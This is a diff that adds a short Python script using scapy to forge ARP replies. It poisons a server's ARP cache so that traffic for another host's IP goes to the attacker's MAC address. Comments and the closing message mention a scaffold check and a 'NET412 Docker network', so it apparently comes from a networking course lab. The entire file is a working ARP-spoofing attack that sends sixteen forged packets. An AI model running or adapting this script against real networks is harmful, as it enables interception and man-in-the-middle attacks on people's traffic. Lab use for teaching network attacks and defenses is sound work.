@@ -1,0 +1,27 @@
+import sys
+from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp
+
+host_a_ip = "10.77.12.10"
+server_1_ip = "10.77.12.20"
+iface = "eth0"
+
+# Target server_1 instead of host_a
+server_1_mac = getmacbyip(server_1_ip)
+host_b_mac = get_if_hwaddr(iface)
+
+# TODO: The ARP reply should claim to be from host_a, at host_b's MAC.
+forged_sender_ip = host_a_ip
+forged_sender_mac = host_b_mac
+
+if not server_1_mac or forged_sender_ip.startswith("REPLACE_") or forged_sender_mac.startswith("REPLACE_"):
+    raise SystemExit("Check the two sender fields for server_1 poisoning")
+if "--check" in sys.argv:
+    print("Scaffold fields ready")
+    raise SystemExit(0)
+
+packet = Ether(src=host_b_mac, dst=server_1_mac) / ARP(
+    op=2, psrc=forged_sender_ip, pdst=server_1_ip,
+    hwsrc=forged_sender_mac, hwdst=server_1_mac,
+)
+sendp(packet, iface=iface, count=16, inter=0.25, verbose=False)
+print("Sent 16 forged ARP replies to server_1 inside the NET412 Docker network")
